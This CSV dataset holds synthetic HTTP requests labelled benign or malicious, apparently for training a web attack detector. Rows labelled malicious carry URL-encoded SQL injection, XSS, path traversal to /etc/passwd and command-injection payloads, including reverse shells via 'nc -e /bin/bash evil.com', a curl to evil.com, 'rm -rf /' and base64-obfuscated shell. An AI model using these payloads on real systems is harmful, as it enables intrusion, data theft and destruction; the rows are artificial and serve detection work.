text,label
PUT /api/reports region=386&new_password=John+Doe&color=405&page=615&sort=I+would+like+to+order User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PUT /profile username=787&last_name=%27%20AND%20%27x%27%3D%27x&limit=test+user User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /docs/api?username=this%20%7Cc%27a%27t%20/etc/passwd%20entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /api/v1/data?title=%26%20whoami&search=751&comment=145&quantity=722 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /api/users?search=John%20%27%3B%20SELECT%20pg_sleep%285%29--%20is User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /api/reports?author=524 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /posts/789?quantity=this+is+a+normal+comment&columns=best+regards&order=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /api/orders content=best%20%26%20nc%20-e%20/bin/bash%20evil.com%204444%20order&q=John+Doe&order=best+regards&author=hello+world User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /api/reports last_name=best%201%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--%20Doe&tags=588&price_min=please+find+attached&action=John+Doe&format=33 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /images/logo.png?format=hello+world&color=620&session=123+Main+St&filter=112&comment=test+user User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /api/orders lang=296&new_password=please+find+attached&first_name=419&password=please+find+attached User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /contact?content=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam&session=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /contact?token=I%20%3B%20%24%28printf%20%27%5Cx6c%5Cx73%27%29%20you User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /about price_min=285&lang=I+would+like+to+order&view=thank%20%27%20AND%20%27x%27%3D%27x%20you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /css/style.css?id=my+address+is&format=%26%20nc%20-e%20/bin/bash%20evil.com%204444&filters=481&search=please+find+attached&order_id=admin+access+request User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /api/orders?phone=best%20%3Cbody%20onload%3Dalert%28document.domain%29%3E%20user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /settings format=77&search_term=contact+me+at+email@example.com&password=John+Doe User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /api/products?author=I+would+like+to+order&q=best%201%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20regards&order=I+would+like+to+order&action=907 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /js/app.js age=contact+me+at+email@example.com&phone=this%20%3Csvg/onload%3Dalert%281%29%3E%20entry&filters=15 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /css/style.css?age=123+Main+St&price_min=392&q=806&first_name=system+log+entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /about?last_name=274&view=986&user_id=644&price_min=my+address+is&rating=80 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
HEAD /api/reports?color=contact%20%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E%20regards User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /api/v2/analytics?quantity=thank+you&search_term=157&author=best+regards User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /images/logo.png?action=test+user&tags=please%20%7C%20curl%20http%3A//evil.com/backdoor%20regards&author=best+regards User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /settings?date=I+would+like+to+order&status=best+regards&columns=thank+you&author=519 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PATCH /help/faq columns=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E&last_name=admin+access+request&age=John+Doe&price_max=741&status=thank+you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /help/faq?phone=John+Doe&page=contact+me+at+email@example.com&date=259&user_id=admin+access+request User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /users/456 type=1%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables-- User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /images/logo.png?old_password=170&comment=please+find+attached&phone=296 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST /register age=/var/www/../../etc/passwd&user_id=820&name=my+address+is User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /profile?columns=admin+access+request&name=282&id=878&limit=172&search_term=admin+access+request User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
HEAD /api/v2/analytics?format=hello+world&comment=contact+me+at+email@example.com&order=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /contact new_password=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /register?sort=contact+me+at+email@example.com&price_min=858&username=test+user&city=492 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /images/logo.png?quantity=472&sort=646 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /images/logo.png password=976 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /api/reports?order_id=please+find+attached&password=12&quantity=112&date=../../../etc/passwd&format=519 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /register city=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /contact new_password=947 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
DELETE /docs/api?tracking=%27%20AND%20SLEEP%285%29-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /register?city=997&last_name=229&page=1%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables-- User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /users/456?author=my+address+is&city=thank+you&action=485 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
OPTIONS /settings?price_max=451&city=thank%20%26%20whoami%20request&email=110&order_id=thank+you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /api/search?city=this%20%27%3B%20SELECT%20pg_sleep%285%29--%20order&name=admin+access+request&rating=419&product_id=913 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /images/logo.png?first_name=123+Main+St&title=538&comment=best+regards&old_password=492 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /api/v2/analytics?name=330&price_max=270&title=system%20%27%20AND%20%27x%27%3D%27x%20user User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /settings?old_password=402&filter=23&search=337&tracking=contact+me+at+email@example.com&order=John+Doe User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /register comment=hello%20%24%28cat%20/etc/shadow%29%20email%40example.com&tracking=668&q=717 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /users/456?category=%3Cbody%20onload%3Dalert%28document.domain%29%3E User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /js/app.js page=%26%20whoami&tags=102&phone=741 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /api/orders search=test%20admin%27--%20world User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /api/orders?filters=best+regards&status=system+log+entry&order=774&first_name=thank+you&token=hello%20%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27--%20you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /posts/789?comment=515&q=admin%27/%2A User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /contact?first_name=John+Doe User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /api/orders id=580&rating=best+regards&password=system%20%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60%20order&page=I+would+like+to+order User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /contact?token=123+Main+St&tags=thank%20%3Csvg/onload%3Dalert%281%29%3E%20Doe&page=254 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /users/456?search_term=this+is+a+normal+comment&new_password=John%20%3B%20%24%28printf%20%27%5Cx6c%5Cx73%27%29%20is&order=984&format=668&price_max=595 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /js/app.js?token=/var/www/../../etc/passwd&lang=this+is+a+normal+comment&name=thank+you User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /products/123?age=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /dashboard format=896 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /api/reports?price_min=test+user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /dashboard?price_min=405 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /register?id=test+user&content=96&product_id=135&password=test%20%27%20OR%20%271%27%3D%271%27--%20world User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /dashboard?columns=best%20%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%20order&lang=523&name=my+address+is User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /api/v2/analytics?status=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&order_id=634&format=best+regards&quantity=925&city=362 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /settings?phone=I%20%60id%60%20St&region=727&tags=544&date=850 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /api/v2/analytics?action=262&price_min=system%20%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%20order&order_id=this+is+a+normal+comment&page=335 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /contact format=please+find+attached&product_id=test+user&tracking=contact+me+at+email@example.com&old_password=502 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
GET /js/app.js?columns=730 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
HEAD /users/456?product_id=852 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE /docs/api?sort=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /help/faq?age=753&order_id=361 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /register title=hello+world&region=193&format=system%20%3Csvg%20onload%3Dalert%281%29%3E%20is&order_id=685 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /api/orders?quantity=admin%20....//....//....//etc/passwd%20user User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /help/faq?lang=41&comment=318&new_password=564&token=780&phone=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /about title=240&quantity=987&type=best+regards&new_password=system+log+entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PUT /api/products type=545&search_term=415 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
HEAD /api/users?search_term=336&price_min=953&sort=71&region=168&content=196 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /help/faq?email=797&new_password=885&age=1%27%20AND%20IF%281%3D1%2CSLEEP%285%29%2C0%29--&page=139 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /posts/789?lang=test+user&old_password=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&first_name=697&view=409 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /profile?old_password=984&action=524 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
POST /register comment=352&category=my+address+is&last_name=test+user&filter=test+user&name=system+log+entry User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
HEAD /dashboard?first_name=admin+access+request User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /about?title=516&quantity=901&id=hello+world User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PUT /register old_password=I+would+like+to+order&password=test+user&tags=582&rating=988&new_password=please+find+attached User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
HEAD /js/app.js?new_password=%3Csvg%20onload%3Dalert%281%29%3E&columns=188 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /profile old_password=511&tracking=I+would+like+to+order User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PUT /settings action=889&status=best+regards&id=298&tags=116 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PATCH /about search_term=hello+world&date=123%20admin%27--%20email%40example.com&old_password=test+user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /contact rating=please+find+attached&status=contact+me+at+email@example.com&order=please+find+attached&tags=contact%20%7C%20cat%20/etc/passwd%20request User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /api/v1/data name=969&id=123%20%27%3B%20SELECT%20pg_sleep%285%29--%20you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /css/style.css?old_password=I+would+like+to+order&columns=%3Csvg%20onload%3Dalert%281%29%3E User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /profile?author=hello+world&search=375&category=contact+me+at+email@example.com&id=my+address+is User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
GET /js/app.js?product_id=contact%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20world User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /api/v1/data?price_max=134&filter=588 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
DELETE /settings?search_term=123%20%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20user User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /login?search=thank%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20regards&product_id=I+would+like+to+order User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /contact?phone=%7Cc%27a%27t%20/etc/passwd&category=128&new_password=76&city=thank+you&id=907 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /register?format=594&user_id=264&sort=my+address+is&id=123+Main+St User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /about?action=thank+you&region=%26%20%24%28which%20bash%29%20-c%20%27ls%27&new_password=190 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /login?username=my+address+is&email=test+user&category=489 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST /settings order_id=contact%20%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E%20comment User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /products/123 limit=123+Main+St&columns=157&date=hello+world User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /help/faq columns=615&rating=admin+access+request&comment=262&username=my+address+is&tag=hello+world User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /users/456 last_name=contact+me+at+email@example.com&phone=524&password=contact%20%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20request&name=hello+world User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /api/v1/data?tags=hello+world&comment=hello+world&filter=25&product_id=thank+you&author=my+address+is User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /help/faq?author=admin+access+request&status=John+Doe&lang=938 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /api/v1/data comment=John%20%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E%20comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /register sort=411&quantity=795&category=admin+access+request&search_term=123+Main+St&email=683 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /api/v2/analytics phone=test+user&limit=631 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /css/style.css title=contact+me+at+email@example.com&name=thank%20%3B%20rm%20-rf%20/%20user&first_name=hello+world&color=123+Main+St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /api/v1/data?filter=123%20%3Cbody%20onload%3Dalert%28document.domain%29%3E%20order&q=766&username=123+Main+St&category=614 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /api/users?quantity=1%27%20UNION%20ALL%20SELECT%20username%2Cpassword%2Cemail%20FROM%20users--&page=please+find+attached&username=123+Main+St User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /contact?id=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E&comment=contact+me+at+email@example.com&user_id=best+regards&category=test+user&filters=987 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /api/users quantity=this%20%27%20OR%20%271%27%3D%271%27--%20is&token=best+regards User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /settings?session=test+user&password=contact%20%27%20AND%201%3D2--%20you&rating=thank+you&old_password=my+address+is User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /posts/789 color=862&author=875 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /api/products last_name=thank%20%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd%20regards&action=123+Main+St&age=thank+you User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /profile comment=353&lang=system+log+entry User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /register?password=best+regards&product_id=912 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
HEAD /js/app.js?token=contact+me+at+email@example.com&search_term=thank+you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /products/123?username=....//....//....//etc/passwd User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /api/v2/analytics title=310&search=%3Csvg%20onload%3Dalert%281%29%3E&type=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /contact filters=132&action=this+is+a+normal+comment&new_password=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST /api/users price_min=123+Main+St&filter=212&search_term=admin+access+request&filters=test+user&product_id=86 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /api/reports?search=contact+me+at+email@example.com&lang=603&format=hello+world&order_id=this%20....//....//....//etc/passwd%20you&quantity=633 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /about?type=contact+me+at+email@example.com&name=673 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
OPTIONS /products/123?name=my+address+is&region=system+log+entry&date=this%20%26%20%24%28which%20bash%29%20-c%20%27ls%27%20comment&age=735 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /api/products?old_password=John+Doe&view=%26%20%24%28which%20bash%29%20-c%20%27ls%27 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /js/app.js session=705&quantity=319&city=453&user_id=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /contact password=63&type=John%20%27%20AND%20%27x%27%3D%27x%20is User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /dashboard tag=hello%201%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--%20attached&page=430 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /css/style.css?region=hello+world&price_min=best+regards&filters=333&content=%26%20nc%20-e%20/bin/bash%20evil.com%204444 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /posts/789?price_min=123+Main+St User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /api/reports?price_max=contact+me+at+email@example.com&token=848&status=%7C%20cat%20/etc/passwd User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /api/reports product_id=contact+me+at+email@example.com&email=123+Main+St&password=28 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PATCH /docs/api sort=thank+you&password=admin+access+request&price_max=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /dashboard title=hello+world&phone=my%20%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1--%20request&sort=admin+access+request User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /about?q=best+regards&limit=776&view=%3Cbody%20onload%3Dalert%28document.domain%29%3E&format=182&rating=test+user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /posts/789?color=810&search_term=561&tag=best+regards User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /api/reports?quantity=file%3A///etc/passwd User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
